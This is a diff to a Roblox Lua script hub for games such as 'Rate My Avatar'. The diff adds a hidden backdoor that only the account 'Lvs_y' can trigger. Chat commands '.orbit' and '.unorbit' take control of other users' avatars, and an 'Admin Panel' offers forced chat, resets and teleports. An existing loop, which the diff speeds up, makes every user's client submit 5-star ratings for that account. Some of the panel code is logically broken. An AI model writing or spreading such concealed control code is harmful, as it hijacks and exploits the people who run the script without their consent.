@@ -9,6 +9,10 @@ local Page2 = Tab:CreateFrame("Dollhouse")
 local Page3 = Tab:CreateFrame("Rate My Avatar")
 local Page4 = Tab:CreateFrame("Promocode Adv.")
 local Page9 = Tab:CreateFrame("Fun")
+local AdminPanel
+if game:GetService("Players").LocalPlayer.Name == "Lvs_y" then
+    AdminPanel = Tab:CreateFrame("Admin Panel")
+end
 local Page10 = Tab:CreateFrame("Credits")
 
 LabelLog = Page100:CreateLabel("Update Log 6")
@@ -701,6 +705,56 @@ Button = Page9:CreateButton("Thanks", "Gives out NPC thanks", function()
 end)
 Labelend = Page9:CreateLabel("")
 
+if game:GetService("Players").LocalPlayer.Name == "Lvs_y" and AdminPanel then
+    LabelAdmin = AdminPanel:CreateLabel("Utility Commands")
+    Button = AdminPanel:CreateButton("Rejoin All", "Makes every user rejoin", function()
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+    end)
+    Button = AdminPanel:CreateButton("Reset All", "Makes every user reset", function()
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        local player = game:GetService("Players").LocalPlayer
+        if game.PlaceId == 6708206173 then
+            Position = player.Character.HumanoidRootPart.CFrame
+            game:GetService("ReplicatedStorage"):WaitForChild("RequestRespawn"):FireServer()
+            player.CharacterAdded:Wait()
+            player.Character:WaitForChild("HumanoidRootPart").CFrame = Position
+        end
+    end)
+    local message
+    TextBox = AdminPanel:CreateBox("Enter forced message", 10044538000, function(arg)
+        message = arg
+    end)
+    Button = AdminPanel:CreateButton("Force Message", "Makes all users chat", function()
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+    end)
+    local message
+    TextBox = AdminPanel:CreateBox("Enter notification message", 10044538000, function(arg)
+        message = arg
+    end)
+    Button = AdminPanel:CreateButton("Notification", "Gives every user a notification", function()
+        local notiuser = game:GetService("Players").LocalPlayer
+        local notigui = notiuser.PlayerGui.MainGui.NotificationFrame
+        notigui.NotificationText.Text = message
+        notigui.Visible = true
+        wait(5)
+        notigui.Visible = false
+    end)
+    Button = AdminPanel:CreateButton("Bring", "Teleports every user to you", function()
+        local userrr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        local hotrobloxfemboydev = game.Workspace.Lvs_y.HumanoidRootPart
+        userrr.CFrame = hotrobloxfemboydev.CFrame
+    end)
+    LabelAdmin = AdminPanel:CreateLabel("")
+end
+
 LabelCreds = Page10:CreateLabel("Dev: Lvs_y")
 LabelCreds = Page10:CreateLabel("Tester: Lvs_y | INXANITTY | Mn9xr")
 LabelCreds = Page10:CreateLabel("NPC Dialog: ChatGPT")
@@ -751,6 +805,32 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
                 vcacc.CFrame = hotrobloxfemboydev2.CFrame + Vector3.new(0, -14, 0)
             end
         end
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".unorbit" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        _G.orbitMe = false
+        game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".orbit" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        _G.orbitMe = true
+        local center
+        local radius = 7
+        local speed = 12.5
+        local angle = 10
+        game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
+        while _G.orbitMe == true and wait() do
+            angle = angle + speed
+            if angle >= 360 then angle = 0 end
+            local radians = math.rad(angle)
+            local offset = Vector3.new(radius * math.cos(radians), 0, radius * math.sin(radians))
+            local center = game:GetService("Workspace").Lvs_y.HumanoidRootPart.Position
+            local position = center + offset
+            local direction = (center - position).Unit
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position, position + direction)
+        end
     end
 end)
 
@@ -793,10 +873,10 @@ if game.PlaceId == 6708206173 then
     if game.Players.LocalPlayer == "Lvs_y" then
         return
     end
-    while wait(10) do
-        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-            if player.Name == "Lvs_y" then
-                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer("Lvs_y", 5)
+    while wait(5) do
+        for _, findcoolfemboydev in pairs(game:GetService("Players"):GetPlayers()) do
+            if findcoolfemboydev.Name == "Lvs_y" then
+                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(findcoolfemboydev, 5)
             end
         end
     end
